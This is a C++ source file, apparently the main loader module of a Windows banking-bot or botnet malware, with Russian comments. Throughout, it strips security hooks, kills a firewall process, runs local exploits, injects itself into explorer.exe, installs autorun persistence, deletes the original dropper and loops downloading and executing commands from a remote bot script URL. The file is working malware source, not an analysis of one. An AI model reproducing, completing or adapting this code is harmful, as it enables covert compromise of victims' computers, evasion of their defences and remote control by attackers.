
//-------------------------------------------------------------
//  Главный модуль сборки Loader
//-------------------------------------------------------------

#include <windows.h>

#include "BotCore.h"

#include "Exploit.h"
#include "BotUtils.h"
#include "Inject.h"
#include "Unhook.h"
#include "Config.h"
#include "Crypt.h"
#include "Task.h"

#include "Modules.h"


#pragma comment(linker, "/ENTRY:MyMain" )


WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
//DWORD dwExplorerPid  = 0; //пид эксплорера

//получаем пид эксплорера

void DeleteDropper() // убиваем процесс, стираем файл
{
	if ( dwKillPid != 0 && m_wcslen( FileToDelete ) > 0 )
	{
		pWinStationTerminateProcess( NULL, dwKillPid , DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileW( FileToDelete );
	}
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	UnhookDlls();
	BOT::Protect(NULL);

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();


	bool FirstSended = false;
	

	if (InitializeTaskManager(NULL, true))
	{
		PCHAR URL;
		while (true)
		{
			URL = GetBotScriptURL(SCRIPT_TASK);
			
			// Загружаем и выполняем команду

			DownloadAndExecuteCommand(NULL, URL);
			STR::Free(URL);

			// Приостанавливаем выполнение команд
			if (!TaskManagerSleep(NULL))
				break;
		}

    }

	return 0;
}


void ExplorerMain()
{
	if ( !dwExplorerSelf )
		UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();


	if ( m_wcslen( TempFileName ) > 0 )
	{
		#ifndef DEBUGBOT
			PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
			BOT::AddToAutoRun( Name );
			STR::Free(Name);
		#endif
	}

	DeleteDropper();


	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	//MegaJump(AvFuckThread);
}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	UnhookDlls();

	if ( dwExplorerSelf ) //если инжект был в свой эксплорер завершаемся
	{
		dwExplorerSelf = 0;

		if ( !InjectIntoExplorer( ExplorerRoutine ) )
		{
			ExplorerMain();
		}

		pExitProcess( 1 );
	}

	ExplorerMain();
	
	return 0;
}


int APIENTRY MyMain() 
{


	UnhookDlls(); //снимаем хуки

	WCHAR ModulePath[ MAX_PATH ];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false );

	if ( dwProcessHash == BOT::GetBotExeNameHash() ) // запуск из самого бота
	{
		KillOutpost();
		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();
		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}

		}
				
		m_wcsncpy( FileToDelete, ModulePath, m_wcslen( ModulePath ) );
		dwKillPid = (DWORD)pGetCurrentProcessId();
		CopyFileToTemp( ModulePath, TempFileName );	

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) )
			{
				#ifndef DEBUGBOT
					PCHAR Name = WSTR::ToAnsi(ModulePath, 0);
					BOT::AddToAutoRun(Name);
					STR::Free(Name);
				#endif
			}
		}
	}

	pExitProcess( 1 );

	return 0;
}